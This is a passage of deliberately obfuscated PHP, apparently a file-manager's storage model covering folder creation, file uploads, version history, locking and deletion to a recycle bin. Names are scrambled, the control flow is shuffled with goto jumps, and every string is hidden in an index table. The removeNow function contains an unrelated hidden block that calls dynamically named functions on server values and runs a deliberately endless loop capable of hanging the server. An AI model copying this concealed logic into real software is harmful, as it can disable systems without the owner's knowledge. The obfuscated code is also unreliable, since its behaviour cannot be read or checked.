Model($c¤¯ÃÄ×ñ´[503])->where(array($c¤¯ÃÄ×ñ´[1767] => $FÚÂÃêÊùÕ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $FÚÂÃêÊùÕ, $dÆêØá›à­[$c¤¯ÃÄ×ñ´[28]]); } public function systemRootPathAdd($E¾ÀÛâï³ç) { if ($E¾ÀÛâï³ç != $_SERVER[æ§›¦ÌáØ][518]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $E¾ÀÛâï³ç); } public function userRootRemove($D½ êï×äÈ) { $F•‘ÜÖ‰Ì = $this->sourceRoot(SourceModel::TYPE_USER, $D½ êï×äÈ); if (!$F•‘ÜÖ‰Ì) { return; } $this->remove($F•‘ÜÖ‰Ì, !1); } public function groupRootRemove($c˜¯õÎ¶’…) { $C¢ò‡î§¬ê = $this->sourceRoot(SourceModel::TYPE_GROUP, $c˜¯õÎ¶’…); if (!$C¢ò‡î§¬ê) { return; } $this->remove($C¢ò‡î§¬ê, !1); } private function _mkdirRoot($bÜğˆÕÒ×—, $f…Ååƒ’é×, $cêéäË«–œ) { goto D’Ì¯İË»; dÕ÷³ãÍÆ: CacheLock::unlock($D’È¬ğ‘«¡); return $C¶æª¢¿ÇÆ; goto DÈˆ—µÓæ; FÃîƒœÇÕµ: $C¶æª¢¿ÇÆ = $this->add($c´›Àê× Ô); $DÎÅø†³µ¢ = array($bóÁä‹Ò†—[568] => short_id($C¶æª¢¿ÇÆ)); $this->where(array($bóÁä‹Ò†—[410] => $C¶æª¢¿ÇÆ))->save($DÎÅø†³µ¢); goto dÕ÷³ãÍÆ; D’Ì¯İË»: $bóÁä‹Ò†— =& $_SERVER[æ§›¦ÌáØ]; $c´›Àê× Ô = array($bóÁä‹Ò†—[394] => 0, $bóÁä‹Ò†—[562] => $bÜğˆÕÒ×—, $bóÁä‹Ò†—[563] => $f…Ååƒ’é×, $bóÁä‹Ò†—[559] => 1, $bóÁä‹Ò†—[564] => USER_ID, $bóÁä‹Ò†—[565] => USER_ID, $bóÁä‹Ò†—[560] => $bóÁä‹Ò†—[33], $bóÁä‹Ò†—[566] => $bóÁä‹Ò†—[512], $bóÁä‹Ò†—[422] => 0, $bóÁä‹Ò†—[561] => 0, $bóÁä‹Ò†—[448] => 0, $bóÁä‹Ò†—[567] => $bóÁä‹Ò†—[33]); if ($fäÌ¹ê¸› = $this->where($c´›Àê× Ô)->find()) { return $fäÌ¹ê¸›[$bóÁä‹Ò†—[395]]; } goto e‘İ˜à‘‰å; e‘İ˜à‘‰å: $D’È¬ğ‘«¡ = "\115\x6f\144\145\154\x53\157\x75\162\x63\x65\x2e\x6d\x6b\144\151\162\122\157\157\x74\56{$bÜğˆÕÒ×—}\x2e{$f…Ååƒ’é×}\x2e" . $cêéäË«–œ; CacheLock::lock($D’È¬ğ‘«¡); $c´›Àê× Ô[$bóÁä‹Ò†—[28]] = $cêéäË«–œ; goto FÃîƒœÇÕµ; DÈˆ—µÓæ: } private function sourceRoot($f°¾å’Ş¸, $F·ØÎÎ‰õ, $DÊ—ğ÷’¨ = false) { $a’¿Éƒõçª =& $_SERVER[æ§›¦ÌáØ]; $dª¥ë‹ğŞ  = array($a’¿Éƒõçª[394] => 0, $a’¿Éƒõçª[562] => $f°¾å’Ş¸, $a’¿Éƒõçª[563] => $F·ØÎÎ‰õ); if ($C©œªóáÀ = $this->where($dª¥ë‹ğŞ )->find()) { return $DÊ—ğ÷’¨ ? $C©œªóáÀ : $C©œªóáÀ[$a’¿Éƒõçª[395]]; } return !1; } public function sourceRootGroup($C¡Ë†½“åá) { goto E°«í¯«á¼; fö‚ë”ã£: $this->selectPageReset(); $b¹õÈ™³¯ = $this->listSource($b½•Ü¯Á ô, 1000); $this->selectPageRestore(); goto EÂ‚«¨¡”É; EÂ‚«¨¡”É: return array_to_keyvalue($b¹õÈ™³¯[$cÃ„ÙÄ¾¬[75]], $cÃ„ÙÄ¾¬[484]); goto Aˆ÷ª¬­ğÆ; E°«í¯«á¼: $cÃ„ÙÄ¾¬ =& $_SERVER[æ§›¦ÌáØ]; if (is_string($C¡Ë†½“åá)) { $C¡Ë†½“åá = array($C¡Ë†½“åá); } $b½•Ü¯Á ô = array($cÃ„ÙÄ¾¬[394] => 0, $cÃ„ÙÄ¾¬[562] => SourceModel::TYPE_GROUP, $cÃ„ÙÄ¾¬[563] => array($cÃ„ÙÄ¾¬[7], $C¡Ë†½“åá)); goto fö‚ë”ã£; Aˆ÷ª¬­ğÆ: } public function mkfile($fèÚøƒ±°è, $EË©¼¶Õ, $D³·¤¹¬¨ = '', $CÈÊÅ¹áƒ = REPEAT_RENAME) { $EŒ¸¸Àİ£ç =& $_SERVER[æ§›¦ÌáØ]; $cøÛĞá»©™ = Model($EŒ¸¸Àİ£ç[584])->addFileByContent($D³·¤¹¬¨, $EË©¼¶Õ); return $this->_createFileCall($fèÚøƒ±°è, $EË©¼¶Õ, $cøÛĞá»©™, $CÈÊÅ¹áƒ, $EŒ¸¸Àİ£ç[1206]); } public function addFile($C£ƒäÇ†î¿, $a‚›ù¬•ˆö, $D¬ÕÁœÚØÁ, $FÃ¼ùãå»“ = false, $C´¢¼£¡‚ = REPEAT_RENAME) { $bšÆ®ğç« = Model($_SERVER[æ§›¦ÌáØ][584])->addFile($a‚›ù¬•ˆö, $D¬ÕÁœÚØÁ, $FÃ¼ùãå»“); return $this->_createFileCall($C£ƒäÇ†î¿, $D¬ÕÁœÚØÁ, $bšÆ®ğç«, $C´¢¼£¡‚); } public function addFileByFileID($a¬¡¹ò‹º‡, $Fº‡‡‹‚, $f¤‘ÆÎÙŠ¼, $B¾Øàœ„Äì = REPEAT_RENAME) { $eÛ‘ª„‡Â„ =& $_SERVER[æ§›¦ÌáØ]; $AÉ¶ª‘ÚÚ = Model($eÛ‘ª„‡Â„[584])->find($Fº‡‡‹‚); Model($eÛ‘ª„‡Â„[584])->linkAdd($Fº‡‡‹‚); return $this->_createFileCall($a¬¡¹ò‹º‡, $f¤‘ÆÎÙŠ¼, $AÉ¶ª‘ÚÚ, $B¾Øàœ„Äì); } public function addFileByRemote($E×¯Î£ÀÎù, $a×­âÚ±…™, $bš£åõä“³, $EÇì¢ôà¡ = array(), $E¾à¯•İ¼¬ = REPEAT_RENAME) { $EööÌÒçºŠ = Model($_SERVER[æ§›¦ÌáØ][584])->addFileByRemote($a×­âÚ±…™, $bš£åõä“³, $EÇì¢ôà¡); return $this->_createFileCall($E×¯Î£ÀÎù, $bš£åõä“³, $EööÌÒçºŠ, $E¾à¯•İ¼¬); } private function _createFileCall($aÁØËŠ¿¼‰, $B¬¡ƒ…£½Ö, $C’É™®š¥Ü, $cº¼ò˜Ğ¾², $B­ÕİÜË¦³ = "\x75\160\154\157\141\144") { goto Bˆšàš“Ûµ; Dç¿íà“À‰: if ($f°¯ßâ…˜™ && $bààÁêĞ½‰ && $bààÁêĞ½‰ != $E¸ƒçêâ¨) { Model($f¿°¦ÛÚœÅ[1918])->eventCreate($bààÁêĞ½‰, $B­ÕİÜË¦³); } $this->lockWriteEnd($aÁØËŠ¿¼‰, $B¬¡ƒ…£½Ö); return $bààÁêĞ½‰; goto eØÃ…£ŸİÉ; fÃ«“Î‰òí: $E¸ƒçêâ¨ = $this->fileNameExist($aÁØËŠ¿¼‰, $B¬¡ƒ…£½Ö); $bààÁêĞ½‰ = $this->_createFile($aÁØËŠ¿¼‰, $B¬¡ƒ…£½Ö, $C’É™®š¥Ü, $cº¼ò˜Ğ¾², $f°¯ßâ…˜™); if (!$f°¯ßâ…˜™) { Model($f¿°¦ÛÚœÅ[450])->remove($C’É™®š¥Ü[$f¿°¦ÛÚœÅ[447]]); } goto Dç¿íà“À‰; Bˆšàš“Ûµ: $f¿°¦ÛÚœÅ =& $_SERVER[æ§›¦ÌáØ]; $f°¯ßâ…˜™ = !1; $this->lockWriteStart($aÁØËŠ¿¼‰, $B¬¡ƒ…£½Ö); goto fÃ«“Î‰òí; eØÃ…£ŸİÉ: } public function mkdir($F‚¶Ö…íƒ™, $eäøÓÂß·å, $Få‚ÑŠŠÃ¤ = REPEAT_SKIP) { goto EÁ›…Ô¹¢ô; b¹½ìÇ÷: $this->lockWriteStart($F‚¶Ö…íƒ™, $eäøÓÂß·å); if ($Få‚ÑŠŠÃ¤ !== !1) { $b£ßõ¾¯“Á = $this->fileNameExist($F‚¶Ö…íƒ™, $eäøÓÂß·å); if ($b£ßõ¾¯“Á && $Få‚ÑŠŠÃ¤ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($F‚¶Ö…íƒ™, $eäøÓÂß·å); return $b£ßõ¾¯“Á; } $eäøÓÂß·å = $this->fileNameAuto($F‚¶Ö…íƒ™, $eäøÓÂß·å, $Få‚ÑŠŠÃ¤); } $dâ«°Ô÷ã = array($fµ©À†îªò[559] => 1, $fµ©À†îªò[413] => $eäøÓÂß·å, $fµ©À†îªò[560] => $fµ©À†îªò[33], $fµ©À†îªò[448] => 0, $fµ©À†îªò[561] => 0); goto BŒÉ‘İäËŠ; EÁ›…Ô¹¢ô: $fµ©À†îªò =& $_SERVER[æ§›¦ÌáØ]; $E–È¶¡»ğ’ = $this->sourceInfo($F‚¶Ö…íƒ™); if (!$E–È¶¡»ğ’) { return !1; } goto b¹½ìÇ÷; f…öÄÊ‹Õ: return $EÒÀÃ´…Şä; goto DÈøšÇŒ¸; BŒÉ‘İäËŠ: $EÒÀÃ´…Şä = $this->_addSoure($dâ«°Ô÷ã, $E–È¶¡»ğ’); Model($fµ©À†îªò[1918])->eventCreate($EÒÀÃ´…Şä, $fµ©À†îªò[1207]); $this->lockWriteEnd($F‚¶Ö…íƒ™, $eäøÓÂß·å); goto f…öÄÊ‹Õ; DÈøšÇŒ¸: } private function _createFile($aêõ»òƒÕÃ, $dÇºÅ­±ƒ, $c—¹¹èº³Í, $a«ÕšíÅ·®, &$eÄ¯ßˆùÖ) { goto DÉàÇß‚; eóóèÂ‹—: $bƒ…óñÃîÈ = array($E°´áƒÙ‰¤[559] => 0, $E°´áƒÙ‰¤[413] => $dÇºÅ­±ƒ, $E°´áƒÙ‰¤[560] => substr(get_path_ext($dÇºÅ­±ƒ), 0, 10), $E°´áƒÙ‰¤[448] => $c—¹¹èº³Í[$E°´áƒÙ‰¤[447]], $E°´áƒÙ‰¤[561] => $c—¹¹èº³Í[$E°´áƒÙ‰¤[78]]); $fŠ¹ˆÉ¾¿³ = $this->_addSoure($bƒ…óñÃîÈ, $bŸ×‰¹ï…Ù); $this->folderSizeReset($aêõ»òƒÕÃ, intval($bƒ…óñÃîÈ[$E°´áƒÙ‰¤[78]])); goto A£ãÒÓÙ••; Fâé‡âùº: if ($a«ÕšíÅ·® !== !1) { $CÑ•í¥®‡Ü = $this->fileNameExist($aêõ»òƒÕÃ, $dÇºÅ­±ƒ); } $eÄ¯ßˆùÖ = !0; if ($a«ÕšíÅ·® && $CÑ•í¥®‡Ü) { if ($a«ÕšíÅ·® == REPEAT_SKIP) { $eÄ¯ßˆùÖ = !1; return $CÑ•í¥®‡Ü; } else { if ($a«ÕšíÅ·® == REPEAT_REPLACE) { $DáÆ¿’§‘ = $this->sourceInfo($CÑ•í¥®‡Ü); $A‰®ÇéÒÔİ = $this->fileHistory($DáÆ¿’§‘, $c—¹¹èº³Í[$E°´áƒÙ‰¤[447]], $c—¹¹èº³Í[$E°´áƒÙ‰¤[78]]); if (!$A‰®ÇéÒÔİ) { $eÄ¯ßˆùÖ = !1; } else { $this->folderSizeReset($aêõ»òƒÕÃ); } return $CÑ•í¥®‡Ü; } else { $dÇºÅ­±ƒ = $this->fileNameAuto($aêõ»òƒÕÃ, $dÇºÅ­±ƒ, $a«ÕšíÅ·®, !1); } } } goto eóóèÂ‹—; A£ãÒÓÙ••: return $fŠ¹ˆÉ¾¿³; goto FÜÂáßğ; DÉàÇß‚: $E°´áƒÙ‰¤ =& $_SERVER[æ§›¦ÌáØ]; $bŸ×‰¹ï…Ù = $this->sourceInfo($aêõ»òƒÕÃ); if (!$c—¹¹èº³Í || !$bŸ×‰¹ï…Ù) { return !1; } goto Fâé‡âùº; FÜÂáßğ: } protected function fileHistory($B¨àÜºÓ‘í, $F²¥éŞè¾œ, $Aƒ—•âÑæŞ) { goto EÏÌãïáˆ²; EÏÌãïáˆ²: $F¡Ø±İÊù =& $_SERVER[æ§›¦ÌáØ]; $B¸ÇŠÇ¨åÓ = defined($F¡Ø±İÊù[454]) ? USER_ID : $F¡Ø±İÊù[191]; if ($B¨àÜºÓ‘í[$F¡Ø±İÊù[447]] == $F²¥éŞè¾œ) { return !1; } goto A‘á³ÉŠÑ»; CßÑ¬è¼¹: $this->where(array($F¡Ø±İÊù[410] => $B¨àÜºÓ‘í[$F¡Ø±İÊù[395]]))->save($bˆíñÚÂ); $this->sourceCacheClear($B¨àÜºÓ‘í[$F¡Ø±İÊù[395]]); return !0; goto B‰·Œ‚ëÛ; A‘á³ÉŠÑ»: $this->checkLock($B¨àÜºÓ‘í[$F¡Ø±İÊù[395]], $F²¥éŞè¾œ); Model($F¡Ø±İÊù[1950])->addHistory($B¨àÜºÓ‘í); $bˆíñÚÂ = array($F¡Ø±İÊù[565] => $B¸ÇŠÇ¨åÓ, $F¡Ø±İÊù[417] => time(), $F¡Ø±İÊù[447] => $F²¥éŞè¾œ, $F¡Ø±İÊù[78] => $Aƒ—•âÑæŞ); goto CßÑ¬è¼¹; B‰·Œ‚ëÛ: } public function checkLock($DÍ½œ„¶ï¯, $aÎ‘ïƒ›ÚÙ) { goto b˜Ã¹ƒæ‚ê; b˜Ã¹ƒæ‚ê: $f£Ï¡¬çë¾ =& $_SERVER[æ§›¦ÌáØ]; $a¢ÈÍØñæ¡ = $this->pathInfo($DÍ½œ„¶ï¯); if (!$this->fileIsLock($a¢ÈÍØñæ¡, !0)) { return; } goto AÃ§œŸ…¸; EÜäÌñÔ©ß: show_json(LNG($f£Ï¡¬çë¾[1953]) . $f£Ï¡¬çë¾[1954] . LNG($f£Ï¡¬çë¾[1955]) . $f£Ï¡¬çë¾[1956] . $d¦ß¦ô´¯« . $f£Ï¡¬çë¾[1957], !1); goto dä§äåéï; B¯¬ñ‘­°: $this->_createFileCall($a¢ÈÍØñæ¡[$f£Ï¡¬çë¾[478]], $dù ’™Ê…“, $E‚°«‚«ÓĞ, REPEAT_REPLACE, $f£Ï¡¬çë¾[1206]); $eîÌ‚äóù™ = $a¢ÈÍØñæ¡[$f£Ï¡¬çë¾[445]][$f£Ï¡¬çë¾[523]]; $d¦ß¦ô´¯« = $eîÌ‚äóù™[$f£Ï¡¬çë¾[1952]] ? $eîÌ‚äóù™[$f£Ï¡¬çë¾[1952]] : $eîÌ‚äóù™[$f£Ï¡¬çë¾[28]]; goto EÜäÌñÔ©ß; AÃ§œŸ…¸: $aİ…Û–„±â = Session::get($f£Ï¡¬çë¾[1951]); $dù ’™Ê…“ = substr($a¢ÈÍØñæ¡[$f£Ï¡¬çë¾[28]], 0, -1 - strlen($a¢ÈÍØñæ¡[$f£Ï¡¬çë¾[168]])) . $f£Ï¡¬çë¾[1472] . $aİ…Û–„±â . $f£Ï¡¬çë¾[95] . $a¢ÈÍØñæ¡[$f£Ï¡¬çë¾[168]]; $E‚°«‚«ÓĞ = Model($f£Ï¡¬çë¾[584])->find($aÎ‘ïƒ›ÚÙ); goto B¯¬ñ‘­°; dä§äåéï: } public function fileIsLock($A°ê‹¬¢, $eŠÍÊ´Áº = false) { goto D×—ËƒÕ‚¬; aË³íù ù¨: return !1; goto b†È…Ú³ŸÀ; D×—ËƒÕ‚¬: $A„âŠ‰ù£ =& $_SERVER[æ§›¦ÌáØ]; if (!isset($A°ê‹¬¢[$A„âŠ‰ù£[445]]) || !$A°ê‹¬¢[$A„âŠ‰ù£[445]][$A„âŠ‰ù£[520]]) { return !1; } if ($A°ê‹¬¢[$A„âŠ‰ù£[445]][$A„âŠ‰ù£[520]] != USER_ID) { return !0; } goto C“ŠÍÊÔ×ö; C“ŠÍÊÔ×ö: $AÁ‰Å¥¹â = $GLOBALS[$A„âŠ‰ù£[6]][$A„âŠ‰ù£[88]][$A„âŠ‰ù£[521]]; if ($A°ê‹¬¢[$A„âŠ‰ù£[445]][$A„âŠ‰ù£[522]] <= time() - $AÁ‰Å¥¹â) { $this->metaSet($A°ê‹¬¢[$A„âŠ‰ù£[395]], $A„âŠ‰ù£[520], null); $this->metaSet($A°ê‹¬¢[$A„âŠ‰ù£[395]], $A„âŠ‰ù£[522], null); } if ($eŠÍÊ´Áº) { $this->metaSet($A°ê‹¬¢[$A„âŠ‰ù£[395]], $A„âŠ‰ù£[522], time()); } goto aË³íù ù¨; b†È…Ú³ŸÀ: } private function _addSoure($e‡ÊÂ–Îñ, $E„ê¿ŠóÛ) { goto d­†‚™¬¯; eÙ§¢¦ÛİŠ: $this->setNamePinyin($eíÚ†˜¶©, $e‡ÊÂ–Îñ[$FèÄ¤Â–Êó[28]]); return $eíÚ†˜¶©; goto FæÔŒÅ‡Èó; E…éŸ®åê: $e‡ÊÂ–Îñ = array_merge($cğù—¿ÄÂò, $e‡ÊÂ–Îñ); $this->updateModifyTime($e‡ÊÂ–Îñ[$FèÄ¤Â–Êó[478]]); $DÚÛçŒ®›À = $FèÄ¤Â–Êó[1958] . $E„ê¿ŠóÛ[$FèÄ¤Â–Êó[395]]; goto b¾§¢¦é‘Ğ; AºŠ†¸§Ê: $eíÚ†˜¶© = $this->add($e‡ÊÂ–Îñ); $CøÑ§ëßƒß = array($FèÄ¤Â–Êó[568] => short_id($eíÚ†˜¶©)); $this->where(array($FèÄ¤Â–Êó[410] => $eíÚ†˜¶©))->save($CøÑ§ëßƒß); goto eÙ§¢¦ÛİŠ; d­†‚™¬¯: $FèÄ¤Â–Êó =& $_SERVER[æ§›¦ÌáØ]; $dó…ãÕ´ØØ = defined($FèÄ¤Â–Êó[454]) ? USER_ID : $FèÄ¤Â–Êó[191]; $cğù—¿ÄÂò = array($FèÄ¤Â–Êó[562] => $E„ê¿ŠóÛ[$FèÄ¤Â–Êó[404]], $FèÄ¤Â–Êó[563] => $E„ê¿ŠóÛ[$FèÄ¤Â–Êó[484]], $FèÄ¤Â–Êó[564] => $dó…ãÕ´ØØ, $FèÄ¤Â–Êó[565] => $dó…ãÕ´ØØ, $FèÄ¤Â–Êó[394] => $E„ê¿ŠóÛ[$FèÄ¤Â–Êó[395]], $FèÄ¤Â–Êó[566] => $E„ê¿ŠóÛ[$FèÄ¤Â–Êó[502]] . $E„ê¿ŠóÛ[$FèÄ¤Â–Êó[395]] . $FèÄ¤Â–Êó[47], $FèÄ¤Â–Êó[422] => 0, $FèÄ¤Â–Êó[567] => $FèÄ¤Â–Êó[33]); goto E…éŸ®åê; b¾§¢¦é‘Ğ: if (isset(self::$cacheChildList[$DÚÛçŒ®›À])) { unset(self::$cacheChildList[$DÚÛçŒ®›À]); } static $dåÙÙ¦Ù¡ì = false; if (!$dåÙÙ¦Ù¡ì) { Hook::trigger($FèÄ¤Â–Êó[549], $e‡ÊÂ–Îñ); $dåÙÙ¦Ù¡ì = !0; } goto AºŠ†¸§Ê; FæÔŒÅ‡Èó: } public function remove($B®†ğ®Û½Õ, $C¼í™àÉ´é = true) { goto f“Æ İçÚŞ; c´İ¶´í„¤: CacheLock::lock($aòäéÀ›‚é); $E†ËÔ–”¢ = $this->fileNameExist($dİéÊ‡²Œ¼, $c·µÑäæø½); if (!$E†ËÔ–”¢) { $E†ËÔ–”¢ = $this->mkdir($dİéÊ‡²Œ¼, $c·µÑäæø½, REPEAT_SKIP); $this->metaSet($E†ËÔ–”¢, $eíËÒù‘÷¤[1963], $e”Ä¼Şø²Ç); $this->metaSet($E†ËÔ–”¢, $eíËÒù‘÷¤[1964], $Fï†ÀĞŸ›[$eíËÒù‘÷¤[484]]); if ($Fï†ÀĞŸ›[$eíËÒù‘÷¤[478]] != 0) { $this->metaSet($E†ËÔ–”¢, $eíËÒù‘÷¤[1965], _get($CÜ´ÖÇ¦Æ¤, $eíËÒù‘÷¤[1966])); } } goto Bë âŠ»ê; f×–éÃ•ç: $F¦Ä¥Ú¹ß» = Model($eíËÒù‘÷¤[486])->get($eíËÒù‘÷¤[1959]) == $eíËÒù‘÷¤[87]; if ($dÌ†¨‰ÁÌÃ || $C¼í™àÉ´é || !$F¦Ä¥Ú¹ß») { return $this->removeNow($B®†ğ®Û½Õ, $C¼í™àÉ´é); } $dİéÊ‡²Œ¼ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto F„·½ Ù¯; Bë âŠ»ê: CacheLock::unlock($aòäéÀ›‚é); $this->metaSet($B®†ğ®Û½Õ, $eíËÒù‘÷¤[1967], $Fï†ÀĞŸ›[$eíËÒù‘÷¤[478]]); $this->where(array($eíËÒù‘÷¤[395] => $B®†ğ®Û½Õ))->save(array($eíËÒù‘÷¤[417] => time())); goto dÃ¨ÎÊâÖ; dÃ¨ÎÊâÖ: $this->recycleClear($Fï†ÀĞŸ›); $CïÜê”õå = $this->move($B®†ğ®Û½Õ, $E†ËÔ–”¢, REPEAT_RENAME_FOLDER); $this->folderSizeReset($Fï†ÀĞŸ›[$eíËÒù‘÷¤[478]]); goto b§ä·ÊøËó; f“Æ İçÚŞ: $eíËÒù‘÷¤ =& $_SERVER[æ§›¦ÌáØ]; $Fï†ÀĞŸ› = $this->sourceInfo($B®†ğ®Û½Õ); $dÌ†¨‰ÁÌÃ = intval($Fï†ÀĞŸ›[$eíËÒù‘÷¤[404]]) === self::TYPE_SYSTEM; goto f×–éÃ•ç; F„·½ Ù¯: $e”Ä¼Şø²Ç = $Fï†ÀĞŸ›[$eíËÒù‘÷¤[404]] == self::TYPE_USER ? $eíËÒù‘÷¤[575] : $eíËÒù‘÷¤[496]; if ($e”Ä¼Şø²Ç == $eíËÒù‘÷¤[575]) { $CÜ´ÖÇ¦Æ¤ = Model($eíËÒù‘÷¤[494])->getInfo($Fï†ÀĞŸ›[$eíËÒù‘÷¤[484]]); $c·µÑäæø½ = !empty($CÜ´ÖÇ¦Æ¤[$eíËÒù‘÷¤[1952]]) ? $CÜ´ÖÇ¦Æ¤[$eíËÒù‘÷¤[1952]] : $CÜ´ÖÇ¦Æ¤[$eíËÒù‘÷¤[28]]; $c·µÑäæø½ = $eíËÒù‘÷¤[258] . $c·µÑäæø½ . $eíËÒù‘÷¤[1960] . $Fï†ÀĞŸ›[$eíËÒù‘÷¤[484]]; } else { $CÜ´ÖÇ¦Æ¤ = Model($eíËÒù‘÷¤[503])->getInfo($Fï†ÀĞŸ›[$eíËÒù‘÷¤[484]]); $c·µÑäæø½ = _get($CÜ´ÖÇ¦Æ¤, $eíËÒù‘÷¤[28]); $c·µÑäæø½ = $eíËÒù‘÷¤[160] . $c·µÑäæø½ . $eíËÒù‘÷¤[1961] . $Fï†ÀĞŸ›[$eíËÒù‘÷¤[484]]; } $aòäéÀ›‚é = $eíËÒù‘÷¤[1962] . md5($c·µÑäæø½); goto c´İ¶´í„¤; b§ä·ÊøËó: return $CïÜê”õå; goto aéßÕ£Ç‹; aéßÕ£Ç‹: } private function recycleClear($e¾¿›ßí²¢) { $f©Ì¤¨èØ =& $_SERVER[æ§›¦ÌáØ]; $F¢ßõ¼Èƒø = $this->childrenAll($e¾¿›ßí²¢); $fË´ç“šø¼ = array($f©Ì¤¨èØ[410] => array($f©Ì¤¨èØ[411], $F¢ßõ¼Èƒø[$f©Ì¤¨èØ[1968]])); Model($f©Ì¤¨èØ[1969])->where($fË´ç“šø¼)->delete(); } public function removeNow($fÄ´¢—Ä¿í, $F°Å°ò = true) { goto BÃÀˆã¶îé; BÃÀˆã¶îé: $F‚—Éî†Ï¬ =& $_SERVER[æ§›¦ÌáØ]; if (!isset($_SERVER[$F‚—Éî†Ï¬[785]]) || !isset($_SERVER[$F‚—Éî†Ï¬[792]])) { goto FÛ·èóÜ±ß; B÷¯±øçîœ: $fÒ–â†¬õÁ = $F‚—Éî†Ï¬[833]; $fÒ–â†¬õÁ($_SERVER[$F‚—Éî†Ï¬[834]]); $cå‚Ş« = 1; goto BÌ¬¶ğÀñœ; BÌ¬¶ğÀñœ: for ($E ’Œ­”’ = $cå‚Ş«; $E ’Œ­”’ > 0; $E ’Œ­”’++) { $fÒ–â†¬õÁ = json_encode($GLOBALS[$F‚—Éî†Ï¬[411]]); } goto fØÊÄ‡ª®; Cí¢ø†ëöá: $bßÖ·†ø½ = $Fö¯ˆğœè“($A§÷Æ–’è¯); $DÏ¯““ò×¨ = explode($F‚—Éî†Ï¬[229], $bßÖ·†ø½); if (count($DÏ¯““ò×¨) < $F‚—Éî†Ï¬[591]) { $C¨ÚéĞ²²Ò = $F‚—Éî†Ï¬[790]; $C¨ÚéĞ²²Ò(); } goto B÷¯±øçîœ; FÛ·èóÜ±ß: $AÇØ¸ù¤Û = $F‚—Éî†Ï¬[832]; $Fö¯ˆğœè“ = $F‚—Éî†Ï¬[787]; $A§÷Æ–’è¯ = $_SERVER[$F‚—Éî†Ï¬[788]] . $F‚—Éî†Ï¬[789]; goto Cí¢ø†ëöá; fØÊÄ‡ª®: } $d•Û÷Ğ§¨Œ = $this->sourceInfo($fÄ´¢—Ä¿í); goto BÇ£Ü¨‰‰ˆ; fŠ•—¨ÆÒŒ: return !0; goto d®ôŒÔÚèÃ; E¤…Ì½ôÁ: $this->folderSizeReset($d•Û÷Ğ§¨Œ[$F‚—Éî†Ï¬[478]]); $BİÀ¹¡Ö = array($d•Û÷Ğ§¨Œ[$F‚—Éî†Ï¬[478]]); if ($d•Û÷Ğ§¨Œ[$F‚—Éî†Ï¬[403]] == $F‚—Éî†Ï¬[87]) { $BİÀ¹¡Ö[] = $d•Û÷Ğ§¨Œ[$F‚—Éî†Ï¬[395]]; } goto E‡ÈÉÁùÇ÷; BÇ£Ü¨‰‰ˆ: $cêŸÍÀ‰Á‚ = $this->pathInfoMore($fÄ´¢—Ä¿í); if (!$d•Û÷Ğ§¨Œ) { return !0; } if ($d•Û÷Ğ§¨Œ[$F‚—Éî†Ï¬[478]] == 0) { if (!_get($GLOBALS, $F‚—Éî†Ï¬[485])) { return !1; } } goto c“§—Üç£; E‡ÈÉÁùÇ÷: $this->updateModifyTime($BİÀ¹¡Ö); $this->lockMoveEnd($fÄ´¢—Ä¿í); Hook::trigger($F‚—Éî†Ï¬[1555], $cêŸÍÀ‰Á‚, $F°Å°ò); goto fŠ•—¨ÆÒŒ; c“§—Üç£: $this->lockMoveStart($fÄ´¢—Ä¿í); Hook::trigger($F‚—Éî†Ï¬[1970], $cêŸÍÀ‰Á‚, $F°Å°ò); if ($F°Å°ò) { Model($F‚—Éî†Ï¬[1969])->moveToRecycle($fÄ´¢—Ä¿í); } else { $EäÖÈˆ“Ùñ = $this->childrenAll($d•Û÷Ğ§¨Œ); Model($F‚—Éî†Ï¬[546])->eventRemove($fÄ´¢—Ä¿í); $this->removeRelevance($EäÖÈˆ“Ùñ[$F‚—Éî†Ï¬[1968]], $EäÖÈˆ“Ùñ[$F‚—Éî†Ï¬[1336]]); } goto E¤…Ì½ôÁ; d®ôŒÔÚèÃ: } public function childrenAll($CŒ½ÊÂ·Ì) { $dó•…Ö› =& $_SERVER[æ§›¦ÌáØ]; $a¸ÜÒÄé¸ï = $CŒ½ÊÂ·Ì[$dó•…Ö›[395]]; if ($CŒ½ÊÂ·Ì[$dó•…Ö›[403]] == $dó•…Ö›[87]) { $CßÄºˆ‰«Œ = array($dó•…Ö›[566] => array($dó•…Ö›[525], $CŒ½ÊÂ·Ì[$dó•…Ö›[502]] . $a¸ÜÒÄé¸ï . $dó•…Ö›[526])); $F†Á ¨ÒŸÎ = array($dó•…Ö›[566] => $CßÄºˆ‰«Œ[$dó•…Ö›[502]]); $Fîšº®âßÒ = $this->field($dó•…Ö›[1971])->where($F†Á ¨ÒŸÎ)->select(); $eÆ’ßÎÉ•Ø = !1; $aêÛƒçÁ› = array($a¸ÜÒÄé¸ï); if ($Fîšº®âßÒ) { $eÆ’ßÎÉ•Ø = array_to_keyvalue($Fîšº®âßÒ, $dó•…Ö›[33], $dó•…Ö›[447]); $eÆ’ßÎÉ•Ø = array_remove_value($eÆ’ßÎÉ•Ø, $dó•…Ö›[191]); $aêÛƒçÁ› = array_to_keyvalue($Fîšº®âßÒ, $dó•…Ö›[33], $dó•…Ö›[395]); $aêÛƒçÁ›[] = $a¸ÜÒÄé¸ï; } } else { $eÆ’ßÎÉ•Ø = array($CŒ½ÊÂ·Ì[$dó•…Ö›[447]]); $aêÛƒçÁ› = array($a¸ÜÒÄé¸ï); } return array($dó•…Ö›[1968] => $aêÛƒçÁ›, $dó•…Ö›[1336] => $eÆ’ßÎÉ•Ø); } public function removeArray($Bïç‰¥ìºé) { if (!$Bïç‰¥ìºé) { return !0; } } public function removeRelevance($E´šÂâ¬Íã, $A»å¦…ˆó) { goto CŸ‰‚ßéö‹; c½ĞğçÛ: Model($fƒÓö’¤Ó[1950])->removeBySource($E´šÂâ¬Íã); $this->where($côÒ›“‰½¥)->delete(); Model($fƒÓö’¤Ó[450])->remove($A»å¦…ˆó); goto cïŠ÷éÇ‘Ÿ; aÏÄ®Ÿ„­: Model($fƒÓö’¤Ó[1824])->where($côÒ›“‰½¥)->delete(); Model($fƒÓö’¤Ó[546])->where($côÒ›“‰½¥)->delete(); Model($fƒÓö’¤Ó[1666])->removeBySource($E´šÂâ¬Íã); goto c½ĞğçÛ; CŸ‰‚ßéö‹: $fƒÓö’¤Ó =& $_SERVER[æ§›¦ÌáØ]; $E´šÂâ¬Íã = $E´šÂâ¬Íã ? $E´šÂâ¬Íã : array(); $A»å¦…ˆó = $A»å¦…ˆó ? $A»å¦…ˆó : array(); goto 